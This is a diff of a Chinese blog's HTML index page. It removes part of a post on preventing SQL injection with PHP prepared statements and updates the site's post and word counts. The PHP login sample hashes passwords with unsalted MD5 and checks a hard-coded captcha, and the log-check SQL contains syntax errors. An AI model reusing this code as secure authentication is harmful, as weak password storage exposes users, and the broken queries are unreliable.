-<h3 id="2、-使用预处理来预防SQL注入"><a href="#2、-使用预处理来预防SQL注入" class="headerlink" title="2、  使用预处理来预防SQL注入"></a>2、  使用预处理来预防SQL注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得用户发送的请求</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$vcode</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//验证码的验证</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$vcode</span> !== <span class="string">&#x27;0000&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;vcode-error&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$conn</span> = <span class="title function_ invoke__">create_connection_oop</span>();</span><br><span class="line"></span><br><span class="line"> <span class="comment">//md5加密</span></span><br><span class="line"> <span class="variable">$md5password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//拼接SQL语句并执行它</span></span><br><span class="line"> <span class="comment">//先查用户名对比密码</span></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;select userid,username,password,role from users where username=?&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//绑定查询参数</span></span><br><span class="line"> <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line"> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>,<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//绑定结果参数</span></span><br><span class="line"> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$userid</span>,<span class="variable">$username2</span>,<span class="variable">$password2</span>,<span class="variable">$role</span>);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//认证和授权失败</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$stmt</span>-&gt;num_rows == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5password</span> == <span class="variable">$password2</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;login-pass&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//登录成功后，记录SESSION变量</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>] = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;welcome.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;login-fail&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;login.html&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;login-fail&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;login.html&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">//关闭数据库</span></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="3、-配置MySQL临时日志查看SQL语句"><a href="#3、-配置MySQL临时日志查看SQL语句" class="headerlink" title="3、  配置MySQL临时日志查看SQL语句"></a>3、  配置MySQL临时日志查看SQL语句</h3><p>在MySQL中运行以下语句，开启临时日志，将日志信息保存到表格mysql数据库的general_log表中（验证防护效果）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启</span></span><br><span class="line">USE mysql;</span><br><span class="line">SET GLOBAL log_output = <span class="string">&#x27;TABLE&#x27;</span>;</span><br><span class="line">SET GLOBAL general_log = <span class="string">&#x27;ON&#x27;</span>;</span><br><span class="line"><span class="comment">#  确认</span></span><br><span class="line">SHOW VARIABLES LIKE “general_log”;</span><br></pre></td></tr></table></figure>
-<p>并执行以下语句进行查询确认</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> general_log <span class="keyword">WHEN</span> argument <span class="keyword">LIKE</span> &quot;%username%&quot; <span class="keyword">ORDER</span> <span class="keyword">BY</span> thread_id <span class="keyword">DESC</span> LIMIT <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>完整代码见<a target="_blank" rel="noopener" href="https://github.com/chengstery/security/tree/main/linux_login">https://github.com/chengstery/security/tree/main/linux_login</a></p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-	
-	
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1333,7 +1363,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1397,12 +1427,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">86k</span>
+    <span title="站点总字数">90k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:18</span>
+    <span title="站点阅读时长">1:21</span>
 </div>
   <div class="powered-by">
     <!--由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动-->
@@ -1410,7 +1440,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共25.2k字</span>
+  <span class="post-count">博客全站共26.2k字</span>
 </div>
 
 
